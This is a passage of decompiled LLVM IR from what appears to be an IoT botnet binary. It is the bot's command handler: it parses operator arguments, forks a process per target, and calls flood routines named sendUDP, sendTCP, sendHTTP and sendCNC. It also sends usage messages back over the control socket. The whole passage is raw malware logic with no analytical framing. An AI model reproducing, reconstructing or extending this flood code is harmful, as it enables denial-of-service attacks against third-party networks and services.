  br i1 %v7_f9a4, label %dec_label_pc_faa0, label %dec_label_pc_f9ac

dec_label_pc_f9ac:                                ; preds = %dec_label_pc_f98c
  %v1_f9b0 = add i32 %tmp, 8
  %v1_f9b4 = inttoptr i32 %v1_f9b0 to i32*
  %v2_f9b4 = load i32, i32* %v1_f9b4, align 4
  store i32 %v2_f9b4, i32* @r0, align 4
  %v1_f9bc = call i32 @atol(i32 %v2_f9b4)
  %v7_f9c4 = icmp eq i32 %v1_f9bc, -1
  br i1 %v7_f9c4, label %dec_label_pc_faa0, label %dec_label_pc_f9cc

dec_label_pc_f9cc:                                ; preds = %dec_label_pc_f9ac
  %v1_f9d0 = add i32 %tmp, 16
  %v1_f9d4 = inttoptr i32 %v1_f9d0 to i32*
  %v2_f9d4 = load i32, i32* %v1_f9d4, align 4
  store i32 %v2_f9d4, i32* @r0, align 4
  %v1_f9dc = call i32 @atol(i32 %v2_f9d4)
  %v7_f9e4 = icmp eq i32 %v1_f9dc, -1
  br i1 %v7_f9e4, label %dec_label_pc_faa0, label %dec_label_pc_f9ec

dec_label_pc_f9ec:                                ; preds = %dec_label_pc_f9cc
  %v1_f9f0 = add i32 %tmp, 20
  %v1_f9f4 = inttoptr i32 %v1_f9f0 to i32*
  %v2_f9f4 = load i32, i32* %v1_f9f4, align 4
  store i32 %v2_f9f4, i32* @r0, align 4
  %v1_f9fc = call i32 @atol(i32 %v2_f9f4)
  %v7_fa04 = icmp eq i32 %v1_f9fc, -1
  br i1 %v7_fa04, label %dec_label_pc_faa0, label %dec_label_pc_fa0c

dec_label_pc_fa0c:                                ; preds = %dec_label_pc_f9ec
  %v2_fa14 = load i32, i32* %v1_f9f4, align 4
  store i32 %v2_fa14, i32* @r0, align 4
  %v1_fa1c = call i32 @atol(i32 %v2_fa14)
  %v8_fa28 = icmp sgt i32 %v1_fa1c, 65536
  br i1 %v8_fa28, label %dec_label_pc_faa0, label %dec_label_pc_fa2c

dec_label_pc_fa2c:                                ; preds = %dec_label_pc_fa0c
  %v2_fa34 = load i32, i32* %v1_f9f4, align 4
  store i32 %v2_fa34, i32* @r0, align 4
  %v1_fa3c = call i32 @atol(i32 %v2_fa34)
  store i32 %v1_fa3c, i32* @r2, align 4
  %v8_fa50 = icmp sgt i32 %v1_fa3c, 65500
  br i1 %v8_fa50, label %dec_label_pc_faa0, label %dec_label_pc_fa54

dec_label_pc_fa54:                                ; preds = %dec_label_pc_fa2c
  %v2_fa5c = load i32, i32* %v1_f9d4, align 4
  store i32 %v2_fa5c, i32* @r0, align 4
  %v1_fa64 = call i32 @atol(i32 %v2_fa5c)
  %v8_fa70 = icmp sgt i32 %v1_fa64, 32
  br i1 %v8_fa70, label %dec_label_pc_faa0, label %dec_label_pc_fa74

dec_label_pc_fa74:                                ; preds = %dec_label_pc_fa54
  %v7_fa78 = icmp eq i32 %arg1, 7
  br i1 %v7_fa78, label %dec_label_pc_fa80, label %dec_label_pc_fab8

dec_label_pc_fa80:                                ; preds = %dec_label_pc_fa74
  %v1_fa84 = add i32 %tmp, 24
  %v1_fa88 = inttoptr i32 %v1_fa84 to i32*
  %v2_fa88 = load i32, i32* %v1_fa88, align 4
  store i32 %v2_fa88, i32* @r0, align 4
  %v1_fa90 = call i32 @atol(i32 %v2_fa88)
  %v5_fa9c = icmp sgt i32 %v1_fa90, 0
  br i1 %v5_fa9c, label %dec_label_pc_fab8, label %dec_label_pc_faa0

dec_label_pc_faa0:                                ; preds = %dec_label_pc_fa80, %dec_label_pc_fa54, %dec_label_pc_fa2c, %dec_label_pc_fa0c, %dec_label_pc_f9ec, %dec_label_pc_f9cc, %dec_label_pc_f9ac, %dec_label_pc_f98c, %dec_label_pc_f980
  %v2_faa4 = load i32, i32* @global_var_2d604.55, align 4
  %v3_fab0 = call i32 @sockprintf(i32 %v2_faa4, i32 ptrtoint ([113 x i8]* @global_var_2365c.905 to i32))
  br label %dec_label_pc_1070c

dec_label_pc_fab8:                                ; preds = %dec_label_pc_fa74, %dec_label_pc_fa80
  %v1_fabc = add i32 %tmp, 4
  %v1_fac0 = inttoptr i32 %v1_fabc to i32*
  %v2_fac0 = load i32, i32* %v1_fac0, align 4
  %v2_fad0 = load i32, i32* %v1_f9b4, align 4
  store i32 %v2_fad0, i32* @r0, align 4
  %v1_fad8 = call i32 @atol(i32 %v2_fad0)
  %v2_faec = load i32, i32* %v1_f994, align 4
  store i32 %v2_faec, i32* @r0, align 4
  %v1_faf4 = call i32 @atol(i32 %v2_faec)
  %v2_fb08 = load i32, i32* %v1_f9d4, align 4
  store i32 %v2_fb08, i32* @r0, align 4
  %v1_fb10 = call i32 @atol(i32 %v2_fb08)
  %v2_fb24 = load i32, i32* %v1_f9f4, align 4
  store i32 %v2_fb24, i32* @r0, align 4
  %v1_fb2c = call i32 @atol(i32 %v2_fb24)
  %v7_fb40 = icmp slt i32 %arg1, 7
  br i1 %v7_fb40, label %dec_label_pc_fb60, label %dec_label_pc_fb44

dec_label_pc_fb44:                                ; preds = %dec_label_pc_fab8
  %v1_fb48 = add i32 %tmp, 24
  %v1_fb4c = inttoptr i32 %v1_fb48 to i32*
  %v2_fb4c = load i32, i32* %v1_fb4c, align 4
  store i32 %v2_fb4c, i32* @r0, align 4
  %v1_fb54 = call i32 @atol(i32 %v2_fb4c)
  br label %dec_label_pc_fb68

dec_label_pc_fb60:                                ; preds = %dec_label_pc_fab8
  br label %dec_label_pc_fb68

dec_label_pc_fb68:                                ; preds = %dec_label_pc_fb44, %dec_label_pc_fb60
  %storemerge10 = phi i32 [ 1000, %dec_label_pc_fb60 ], [ %v1_fb54, %dec_label_pc_fb44 ]
  %v7_fb78 = icmp slt i32 %arg1, 8
  br i1 %v7_fb78, label %dec_label_pc_fb98, label %dec_label_pc_fb7c

dec_label_pc_fb7c:                                ; preds = %dec_label_pc_fb68
  %v1_fb80 = add i32 %tmp, 28
  %v1_fb84 = inttoptr i32 %v1_fb80 to i32*
  %v2_fb84 = load i32, i32* %v1_fb84, align 4
  store i32 %v2_fb84, i32* @r0, align 4
  %v1_fb8c = call i32 @atol(i32 %v2_fb84)
  br label %dec_label_pc_fbac

dec_label_pc_fb98:                                ; preds = %dec_label_pc_fb68
  br label %dec_label_pc_fbac

dec_label_pc_fbac:                                ; preds = %dec_label_pc_fb7c, %dec_label_pc_fb98
  %storemerge9 = phi i32 [ 1000000, %dec_label_pc_fb98 ], [ %v1_fb8c, %dec_label_pc_fb7c ]
  %v7_fbbc = icmp slt i32 %arg1, 9
  br i1 %v7_fbbc, label %dec_label_pc_fbdc, label %dec_label_pc_fbc0

dec_label_pc_fbc0:                                ; preds = %dec_label_pc_fbac
  %v1_fbc4 = add i32 %tmp, 32
  %v1_fbc8 = inttoptr i32 %v1_fbc4 to i32*
  %v2_fbc8 = load i32, i32* %v1_fbc8, align 4
  store i32 %v2_fbc8, i32* @r0, align 4
  %v1_fbd0 = call i32 @atol(i32 %v2_fbc8)
  br label %dec_label_pc_fbe4

dec_label_pc_fbdc:                                ; preds = %dec_label_pc_fbac
  br label %dec_label_pc_fbe4

dec_label_pc_fbe4:                                ; preds = %dec_label_pc_fbc0, %dec_label_pc_fbdc
  %storemerge8 = phi i32 [ 0, %dec_label_pc_fbdc ], [ %v1_fbd0, %dec_label_pc_fbc0 ]
  %v2_fbf8 = call i32 @__GI_strchr(i32 %v2_fac0, i32 44)
  %v2_fc00 = icmp eq i32 %v2_fbf8, 0
  br i1 %v2_fc00, label %dec_label_pc_fc94, label %dec_label_pc_fc08

dec_label_pc_fc08:                                ; preds = %dec_label_pc_fbe4
  store i32 %v2_fac0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1bc90.405 to i32), i32* @r1, align 4
  %v2_fc14 = call i32 @__GI_strtok(i32 %v2_fac0, i32 ptrtoint (i32* @global_var_1bc90.405 to i32))
  %v2_fc8827 = icmp eq i32 %v2_fc14, 0
  br i1 %v2_fc8827, label %dec_label_pc_1070c, label %dec_label_pc_fc24

dec_label_pc_fc24:                                ; preds = %dec_label_pc_fc08, %dec_label_pc_fc70
  %storemerge2128 = phi i32 [ %v2_fc78, %dec_label_pc_fc70 ], [ %v2_fc14, %dec_label_pc_fc08 ]
  %v0_fc24 = call i32 @listFork()
  %v2_fc2c = icmp eq i32 %v0_fc24, 0
  br i1 %v2_fc2c, label %dec_label_pc_fc34, label %dec_label_pc_fc70

dec_label_pc_fc34:                                ; preds = %dec_label_pc_fc24
  %v8_fc64 = call i32 @sendUDP(i32 %storemerge2128, i32 %v1_fad8, i32 %v1_faf4, i32 %v1_fb10, i32 %v1_fb2c, i32 %storemerge10, i32 %storemerge9, i32 %storemerge8)
  %v1_fc6c = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_fc70:                                ; preds = %dec_label_pc_fc24
  store i32 0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1bc90.405 to i32), i32* @r1, align 4
  %v2_fc78 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1bc90.405 to i32))
  %v2_fc88 = icmp eq i32 %v2_fc78, 0
  br i1 %v2_fc88, label %dec_label_pc_1070c, label %dec_label_pc_fc24

dec_label_pc_fc94:                                ; preds = %dec_label_pc_fbe4
  %v0_fc94 = call i32 @listFork()
  %v2_fc9c = icmp eq i32 %v0_fc94, 0
  br i1 %v2_fc9c, label %dec_label_pc_fca4, label %dec_label_pc_1070c

dec_label_pc_fca4:                                ; preds = %dec_label_pc_fc94
  %v8_fcd4 = call i32 @sendUDP(i32 %v2_fac0, i32 %v1_fad8, i32 %v1_faf4, i32 %v1_fb10, i32 %v1_fb2c, i32 %storemerge10, i32 %storemerge9, i32 %storemerge8)
  %v1_fcdc = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_fce0:                                ; preds = %dec_label_pc_f960
  %v2_fce4 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_236d0.908 to i32), i32* @r1, align 4
  %v3_fcf0 = inttoptr i32 %v2_fce4 to i8*
  %v4_fcf0 = call i32 @__GI_strcoll(i8* %v3_fcf0, i32 ptrtoint ([4 x i8]* @global_var_236d0.908 to i32))
  %v2_fcf8 = icmp eq i32 %v4_fcf0, 0
  br i1 %v2_fcf8, label %dec_label_pc_fd00, label %dec_label_pc_ffc4

dec_label_pc_fd00:                                ; preds = %dec_label_pc_fce0
  %v7_fd08 = icmp slt i32 %arg1, 6
  br i1 %v7_fd08, label %dec_label_pc_fde4, label %dec_label_pc_fd0c

dec_label_pc_fd0c:                                ; preds = %dec_label_pc_fd00
  %v1_fd10 = add i32 %tmp, 12
  %v1_fd14 = inttoptr i32 %v1_fd10 to i32*
  %v2_fd14 = load i32, i32* %v1_fd14, align 4
  store i32 %v2_fd14, i32* @r0, align 4
  %v1_fd1c = call i32 @atol(i32 %v2_fd14)
  %v7_fd24 = icmp eq i32 %v1_fd1c, -1
  br i1 %v7_fd24, label %dec_label_pc_fde4, label %dec_label_pc_fd2c

dec_label_pc_fd2c:                                ; preds = %dec_label_pc_fd0c
  %v1_fd30 = add i32 %tmp, 8
  %v1_fd34 = inttoptr i32 %v1_fd30 to i32*
  %v2_fd34 = load i32, i32* %v1_fd34, align 4
  store i32 %v2_fd34, i32* @r0, align 4
  %v1_fd3c = call i32 @atol(i32 %v2_fd34)
  %v7_fd44 = icmp eq i32 %v1_fd3c, -1
  br i1 %v7_fd44, label %dec_label_pc_fde4, label %dec_label_pc_fd4c

dec_label_pc_fd4c:                                ; preds = %dec_label_pc_fd2c
  %v1_fd50 = add i32 %tmp, 16
  %v1_fd54 = inttoptr i32 %v1_fd50 to i32*
  %v2_fd54 = load i32, i32* %v1_fd54, align 4
  store i32 %v2_fd54, i32* @r0, align 4
  %v1_fd5c = call i32 @atol(i32 %v2_fd54)
  %v7_fd64 = icmp eq i32 %v1_fd5c, -1
  br i1 %v7_fd64, label %dec_label_pc_fde4, label %dec_label_pc_fd6c

dec_label_pc_fd6c:                                ; preds = %dec_label_pc_fd4c
  %v2_fd74 = load i32, i32* %v1_fd54, align 4
  store i32 %v2_fd74, i32* @r0, align 4
  %v1_fd7c = call i32 @atol(i32 %v2_fd74)
  %v8_fd88 = icmp sgt i32 %v1_fd7c, 32
  br i1 %v8_fd88, label %dec_label_pc_fde4, label %dec_label_pc_fd8c

dec_label_pc_fd8c:                                ; preds = %dec_label_pc_fd6c
  %v7_fd94 = icmp slt i32 %arg1, 7
  br i1 %v7_fd94, label %dec_label_pc_fdb8, label %dec_label_pc_fd98

dec_label_pc_fd98:                                ; preds = %dec_label_pc_fd8c
  %v1_fd9c = add i32 %tmp, 24
  %v1_fda0 = inttoptr i32 %v1_fd9c to i32*
  %v2_fda0 = load i32, i32* %v1_fda0, align 4
  store i32 %v2_fda0, i32* @r0, align 4
  %v1_fda8 = call i32 @atol(i32 %v2_fda0)
  %v1_fdb0 = icmp slt i32 %v1_fda8, 0
  br i1 %v1_fdb0, label %dec_label_pc_fde4, label %dec_label_pc_fdb8

dec_label_pc_fdb8:                                ; preds = %dec_label_pc_fd98, %dec_label_pc_fd8c
  %v7_fdbc = icmp eq i32 %arg1, 8
  br i1 %v7_fdbc, label %dec_label_pc_fdc4, label %dec_label_pc_fdfc

dec_label_pc_fdc4:                                ; preds = %dec_label_pc_fdb8
  %v1_fdc8 = add i32 %tmp, 28
  %v1_fdcc = inttoptr i32 %v1_fdc8 to i32*
  %v2_fdcc = load i32, i32* %v1_fdcc, align 4
  store i32 %v2_fdcc, i32* @r0, align 4
  %v1_fdd4 = call i32 @atol(i32 %v2_fdcc)
  %v5_fde0 = icmp sgt i32 %v1_fdd4, 0
  br i1 %v5_fde0, label %dec_label_pc_fdfc, label %dec_label_pc_fde4

dec_label_pc_fde4:                                ; preds = %dec_label_pc_fdc4, %dec_label_pc_fd98, %dec_label_pc_fd6c, %dec_label_pc_fd4c, %dec_label_pc_fd2c, %dec_label_pc_fd0c, %dec_label_pc_fd00
  %v2_fde8 = load i32, i32* @global_var_2d604.55, align 4
  %v3_fdf4 = call i32 @sockprintf(i32 %v2_fde8, i32 ptrtoint ([186 x i8]* @global_var_236d4.910 to i32))
  br label %dec_label_pc_1070c

dec_label_pc_fdfc:                                ; preds = %dec_label_pc_fdb8, %dec_label_pc_fdc4
  %v1_fe00 = add i32 %tmp, 4
  %v1_fe04 = inttoptr i32 %v1_fe00 to i32*
  %v2_fe04 = load i32, i32* %v1_fe04, align 4
  %v2_fe14 = load i32, i32* %v1_fd34, align 4
  store i32 %v2_fe14, i32* @r0, align 4
  %v1_fe1c = call i32 @atol(i32 %v2_fe14)
  %v2_fe30 = load i32, i32* %v1_fd14, align 4
  store i32 %v2_fe30, i32* @r0, align 4
  %v1_fe38 = call i32 @atol(i32 %v2_fe30)
  %v2_fe4c = load i32, i32* %v1_fd54, align 4
  store i32 %v2_fe4c, i32* @r0, align 4
  %v1_fe54 = call i32 @atol(i32 %v2_fe4c)
  %v1_fe64 = add i32 %tmp, 20
  %v1_fe68 = inttoptr i32 %v1_fe64 to i32*
  %v2_fe68 = load i32, i32* %v1_fe68, align 4
  br i1 %v7_fdbc, label %dec_label_pc_fe7c, label %dec_label_pc_fe98

dec_label_pc_fe7c:                                ; preds = %dec_label_pc_fdfc
  %v1_fe80 = add i32 %tmp, 28
  %v1_fe84 = inttoptr i32 %v1_fe80 to i32*
  %v2_fe84 = load i32, i32* %v1_fe84, align 4
  store i32 %v2_fe84, i32* @r0, align 4
  %v1_fe8c = call i32 @atol(i32 %v2_fe84)
  br label %dec_label_pc_fea0

dec_label_pc_fe98:                                ; preds = %dec_label_pc_fdfc
  br label %dec_label_pc_fea0

dec_label_pc_fea0:                                ; preds = %dec_label_pc_fe7c, %dec_label_pc_fe98
  %storemerge7 = phi i32 [ 10, %dec_label_pc_fe98 ], [ %v1_fe8c, %dec_label_pc_fe7c ]
  br i1 %v7_fd94, label %dec_label_pc_fed0, label %dec_label_pc_feb4

dec_label_pc_feb4:                                ; preds = %dec_label_pc_fea0
  %v1_feb8 = add i32 %tmp, 24
  %v1_febc = inttoptr i32 %v1_feb8 to i32*
  %v2_febc = load i32, i32* %v1_febc, align 4
  store i32 %v2_febc, i32* @r0, align 4
  %v1_fec4 = call i32 @atol(i32 %v2_febc)
  br label %dec_label_pc_fed8

dec_label_pc_fed0:                                ; preds = %dec_label_pc_fea0
  br label %dec_label_pc_fed8

dec_label_pc_fed8:                                ; preds = %dec_label_pc_feb4, %dec_label_pc_fed0
  %storemerge6 = phi i32 [ 0, %dec_label_pc_fed0 ], [ %v1_fec4, %dec_label_pc_feb4 ]
  %v2_feec = call i32 @__GI_strchr(i32 %v2_fe04, i32 44)
  %v2_fef4 = icmp eq i32 %v2_feec, 0
  br i1 %v2_fef4, label %dec_label_pc_ff80, label %dec_label_pc_fefc

dec_label_pc_fefc:                                ; preds = %dec_label_pc_fed8
  store i32 %v2_fe04, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1bc90.405 to i32), i32* @r1, align 4
  %v2_ff08 = call i32 @__GI_strtok(i32 %v2_fe04, i32 ptrtoint (i32* @global_var_1bc90.405 to i32))
  %v2_ff7438 = icmp eq i32 %v2_ff08, 0
  br i1 %v2_ff7438, label %dec_label_pc_ffc4, label %dec_label_pc_ff18

dec_label_pc_ff18:                                ; preds = %dec_label_pc_fefc, %dec_label_pc_ff5c
  %storemerge1939 = phi i32 [ %v2_ff64, %dec_label_pc_ff5c ], [ %v2_ff08, %dec_label_pc_fefc ]
  %v0_ff18 = call i32 @listFork()
  %v2_ff20 = icmp eq i32 %v0_ff18, 0
  br i1 %v2_ff20, label %dec_label_pc_ff28, label %dec_label_pc_ff5c

dec_label_pc_ff28:                                ; preds = %dec_label_pc_ff18
  %v7_ff50 = call i32 @sendTCP(i32 %storemerge1939, i32 %v1_fe1c, i32 %v1_fe38, i32 %v1_fe54, i32 %v2_fe68, i32 %storemerge6, i32 %storemerge7)
  %v1_ff58 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_ff5c:                                ; preds = %dec_label_pc_ff18
  store i32 0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1bc90.405 to i32), i32* @r1, align 4
  %v2_ff64 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1bc90.405 to i32))
  %v2_ff74 = icmp eq i32 %v2_ff64, 0
  br i1 %v2_ff74, label %dec_label_pc_ffc4, label %dec_label_pc_ff18

dec_label_pc_ff80:                                ; preds = %dec_label_pc_fed8
  %v0_ff80 = call i32 @listFork()
  %v2_ff88 = icmp eq i32 %v0_ff80, 0
  br i1 %v2_ff88, label %dec_label_pc_ff90, label %dec_label_pc_ffc4

dec_label_pc_ff90:                                ; preds = %dec_label_pc_ff80
  %v7_ffb8 = call i32 @sendTCP(i32 %v2_fe04, i32 %v1_fe1c, i32 %v1_fe38, i32 %v1_fe54, i32 %v2_fe68, i32 %storemerge6, i32 %storemerge7)
  %v1_ffc0 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_ffc4:                                ; preds = %dec_label_pc_ff5c, %dec_label_pc_fefc, %dec_label_pc_ff80, %dec_label_pc_fce0
  %v2_ffc8 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_23790.912 to i32), i32* @r1, align 4
  %v3_ffd4 = inttoptr i32 %v2_ffc8 to i8*
  %v4_ffd4 = call i32 @__GI_strcoll(i8* %v3_ffd4, i32 ptrtoint ([5 x i8]* @global_var_23790.912 to i32))
  %v2_ffdc = icmp eq i32 %v4_ffd4, 0
  br i1 %v2_ffdc, label %dec_label_pc_ffe4, label %dec_label_pc_101cc

dec_label_pc_ffe4:                                ; preds = %dec_label_pc_ffc4
  %v7_ffec = icmp slt i32 %arg1, 6
  br i1 %v7_ffec, label %dec_label_pc_1070c, label %dec_label_pc_fff0

dec_label_pc_fff0:                                ; preds = %dec_label_pc_ffe4
  %v1_fff4 = add i32 %tmp, 4
  %v1_fff8 = inttoptr i32 %v1_fff4 to i32*
  %v2_fff8 = load i32, i32* %v1_fff8, align 4
  %v2_10004 = call i32 @__GI_strchr(i32 %v2_fff8, i32 44)
  %v2_1000c = icmp eq i32 %v2_10004, 0
  br i1 %v2_1000c, label %dec_label_pc_10114, label %dec_label_pc_10014

dec_label_pc_10014:                               ; preds = %dec_label_pc_fff0
  %v2_1001c = load i32, i32* %v1_fff8, align 4
  store i32 %v2_1001c, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1bc90.405 to i32), i32* @r1, align 4
  %v2_10028 = call i32 @__GI_strtok(i32 %v2_1001c, i32 ptrtoint (i32* @global_var_1bc90.405 to i32))
  %v2_1010836 = icmp eq i32 %v2_10028, 0
  br i1 %v2_1010836, label %dec_label_pc_101cc, label %dec_label_pc_10038

dec_label_pc_10038:                               ; preds = %dec_label_pc_10014, %dec_label_pc_100f0
  %v0_10038 = call i32 @listFork()
  %v2_10040 = icmp eq i32 %v0_10038, 0
  br i1 %v2_10040, label %dec_label_pc_10048, label %dec_label_pc_100f0

dec_label_pc_10048:                               ; preds = %dec_label_pc_10038
  %v2_10050 = load i32, i32* %v1_fff8, align 4
  store i32 %v2_10050, i32* @r5, align 4
  %v1_1005c = add i32 %tmp, 8
  %v1_10060 = inttoptr i32 %v1_1005c to i32*
  %v2_10060 = load i32, i32* %v1_10060, align 4
  store i32 %v2_10060, i32* @r6, align 4
  %v1_1006c = add i32 %tmp, 12
  %v1_10070 = inttoptr i32 %v1_1006c to i32*
  %v2_10070 = load i32, i32* %v1_10070, align 4
  store i32 %v2_10070, i32* @r0, align 4
  %v1_10078 = call i32 @atol(i32 %v2_10070)
  %v3_10084 = urem i32 %v1_10078, 65536
  store i32 %v3_10084, i32* @r7, align 4
  %v1_10090 = add i32 %tmp, 16
  %v1_10094 = inttoptr i32 %v1_10090 to i32*
  %v2_10094 = load i32, i32* %v1_10094, align 4
  store i32 %v2_10094, i32* @r8, align 4
  %v1_100a0 = add i32 %tmp, 20
  %v1_100a4 = inttoptr i32 %v1_100a0 to i32*
  %v2_100a4 = load i32, i32* %v1_100a4, align 4
  store i32 %v2_100a4, i32* @r0, align 4
  %v1_100ac = call i32 @atol(i32 %v2_100a4)
  store i32 %v1_100ac, i32* @r4, align 4
  %v1_100b8 = add i32 %tmp, 24
  %v1_100bc = inttoptr i32 %v1_100b8 to i32*
  %v2_100bc = load i32, i32* %v1_100bc, align 4
  store i32 %v2_100bc, i32* @r0, align 4
  %v1_100c4 = call i32 @atol(i32 %v2_100bc)
  %v0_100cc = load i32, i32* @r4, align 4
  %v0_100d4 = load i32, i32* @r5, align 4
  %v0_100d8 = load i32, i32* @r6, align 4
  %v0_100dc = load i32, i32* @r7, align 4
  %v0_100e0 = load i32, i32* @r8, align 4
  %v6_100e4 = trunc i32 %v0_100dc to i8
  %v7_100e4 = call i32 @sendHTTP(i32 %v0_100d4, i32 %v0_100d8, i8 %v6_100e4, i32 %v0_100e0, i32 %v0_100cc, i32 %v1_100c4)
  %v1_100ec = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_100f0:                               ; preds = %dec_label_pc_10038
  store i32 0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1bc90.405 to i32), i32* @r1, align 4
  %v2_100f8 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1bc90.405 to i32))
  %v2_10108 = icmp eq i32 %v2_100f8, 0
  br i1 %v2_10108, label %dec_label_pc_101cc, label %dec_label_pc_10038

dec_label_pc_10114:                               ; preds = %dec_label_pc_fff0
  %v0_10114 = call i32 @listFork()
  %v2_1011c = icmp eq i32 %v0_10114, 0
  br i1 %v2_1011c, label %dec_label_pc_10124, label %dec_label_pc_1070c

dec_label_pc_10124:                               ; preds = %dec_label_pc_10114
  %v2_1012c = load i32, i32* %v1_fff8, align 4
  store i32 %v2_1012c, i32* @r5, align 4
  %v1_10138 = add i32 %tmp, 8
  %v1_1013c = inttoptr i32 %v1_10138 to i32*
  %v2_1013c = load i32, i32* %v1_1013c, align 4
  store i32 %v2_1013c, i32* @r6, align 4
  %v1_10148 = add i32 %tmp, 12
  %v1_1014c = inttoptr i32 %v1_10148 to i32*
  %v2_1014c = load i32, i32* %v1_1014c, align 4
  store i32 %v2_1014c, i32* @r0, align 4
  %v1_10154 = call i32 @atol(i32 %v2_1014c)
  %v3_10160 = urem i32 %v1_10154, 65536
  store i32 %v3_10160, i32* @r7, align 4
  %v1_1016c = add i32 %tmp, 16
  %v1_10170 = inttoptr i32 %v1_1016c to i32*
  %v2_10170 = load i32, i32* %v1_10170, align 4
  store i32 %v2_10170, i32* @r8, align 4
  %v1_1017c = add i32 %tmp, 20
  %v1_10180 = inttoptr i32 %v1_1017c to i32*
  %v2_10180 = load i32, i32* %v1_10180, align 4
  store i32 %v2_10180, i32* @r0, align 4
  %v1_10188 = call i32 @atol(i32 %v2_10180)
  store i32 %v1_10188, i32* @r4, align 4
  %v1_10194 = add i32 %tmp, 24
  %v1_10198 = inttoptr i32 %v1_10194 to i32*
  %v2_10198 = load i32, i32* %v1_10198, align 4
  store i32 %v2_10198, i32* @r0, align 4
  %v1_101a0 = call i32 @atol(i32 %v2_10198)
  %v0_101a8 = load i32, i32* @r4, align 4
  %v0_101b0 = load i32, i32* @r5, align 4
  %v0_101b4 = load i32, i32* @r6, align 4
  %v0_101b8 = load i32, i32* @r7, align 4
  %v0_101bc = load i32, i32* @r8, align 4
  %v6_101c0 = trunc i32 %v0_101b8 to i8
  %v7_101c0 = call i32 @sendHTTP(i32 %v0_101b0, i32 %v0_101b4, i8 %v6_101c0, i32 %v0_101bc, i32 %v0_101a8, i32 %v1_101a0)
  %v1_101c8 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_101cc:                               ; preds = %dec_label_pc_100f0, %dec_label_pc_10014, %dec_label_pc_ffc4
  %v2_101d0 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_23798.914 to i32), i32* @r1, align 4
  %v3_101dc = inttoptr i32 %v2_101d0 to i8*
  %v4_101dc = call i32 @__GI_strcoll(i8* %v3_101dc, i32 ptrtoint ([4 x i8]* @global_var_23798.914 to i32))
  %v2_101e4 = icmp eq i32 %v4_101dc, 0
  br i1 %v2_101e4, label %dec_label_pc_101ec, label %dec_label_pc_10354

dec_label_pc_101ec:                               ; preds = %dec_label_pc_101cc
  %v7_101f4 = icmp slt i32 %arg1, 4
  br i1 %v7_101f4, label %dec_label_pc_10238, label %dec_label_pc_101f8

dec_label_pc_101f8:                               ; preds = %dec_label_pc_101ec
  %v1_101fc = add i32 %tmp, 8
  %v1_10200 = inttoptr i32 %v1_101fc to i32*
  %v2_10200 = load i32, i32* %v1_10200, align 4
  store i32 %v2_10200, i32* @r0, align 4
  %v1_10208 = call i32 @atol(i32 %v2_10200)
  %tmp106 = icmp slt i32 %v1_10208, 1
  br i1 %tmp106, label %dec_label_pc_10238, label %dec_label_pc_10218

dec_label_pc_10218:                               ; preds = %dec_label_pc_101f8
  %v1_1021c = add i32 %tmp, 12
  %v1_10220 = inttoptr i32 %v1_1021c to i32*
  %v2_10220 = load i32, i32* %v1_10220, align 4
  store i32 %v2_10220, i32* @r0, align 4
  %v1_10228 = call i32 @atol(i32 %v2_10220)
  %v5_10234 = icmp sgt i32 %v1_10228, 0
  br i1 %v5_10234, label %dec_label_pc_10250, label %dec_label_pc_10238

dec_label_pc_10238:                               ; preds = %dec_label_pc_10218, %dec_label_pc_101f8, %dec_label_pc_101ec
  %v2_1023c = load i32, i32* @global_var_2d604.55, align 4
  %v3_10248 = call i32 @sockprintf(i32 %v2_1023c, i32 ptrtoint ([27 x i8]* @global_var_2379c.916 to i32))
  br label %dec_label_pc_1070c

dec_label_pc_10250:                               ; preds = %dec_label_pc_10218
  %v1_10254 = add i32 %tmp, 4
  %v1_10258 = inttoptr i32 %v1_10254 to i32*
  %v2_10258 = load i32, i32* %v1_10258, align 4
  %v2_10268 = load i32, i32* %v1_10200, align 4
  store i32 %v2_10268, i32* @r0, align 4
  %v1_10270 = call i32 @atol(i32 %v2_10268)
  %v2_10284 = load i32, i32* %v1_10220, align 4
  store i32 %v2_10284, i32* @r0, align 4
  %v1_1028c = call i32 @atol(i32 %v2_10284)
  %v2_102a4 = call i32 @__GI_strchr(i32 %v2_10258, i32 44)
  %v2_102ac = icmp eq i32 %v2_102a4, 0
  br i1 %v2_102ac, label %dec_label_pc_1032c, label %dec_label_pc_102b4

dec_label_pc_102b4:                               ; preds = %dec_label_pc_10250
  store i32 %v2_10258, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1bc90.405 to i32), i32* @r1, align 4
  %v2_102c0 = call i32 @__GI_strtok(i32 %v2_10258, i32 ptrtoint (i32* @global_var_1bc90.405 to i32))
  %v2_1032033 = icmp eq i32 %v2_102c0, 0
  br i1 %v2_1032033, label %dec_label_pc_10354, label %dec_label_pc_102d0

dec_label_pc_102d0:                               ; preds = %dec_label_pc_102b4, %dec_label_pc_10308
  %storemerge1534 = phi i32 [ %v2_10310, %dec_label_pc_10308 ], [ %v2_102c0, %dec_label_pc_102b4 ]
  %v0_102d0 = call i32 @listFork()
  %v2_102d8 = icmp eq i32 %v0_102d0, 0
  br i1 %v2_102d8, label %dec_label_pc_102e0, label %dec_label_pc_10308

dec_label_pc_102e0:                               ; preds = %dec_label_pc_102d0
  %v4_102ec = call i32 @sendCNC(i32 %storemerge1534, i32 %v1_10270, i32 %v1_1028c, i32 0)
  %v2_102f4 = load i32, i32* @global_var_2d604.55, align 4
  %v1_102fc = call i32 @__libc_close(i32 %v2_102f4)
  %v1_10304 = call i32 @__GI__exit(i32 0)
  unreachable

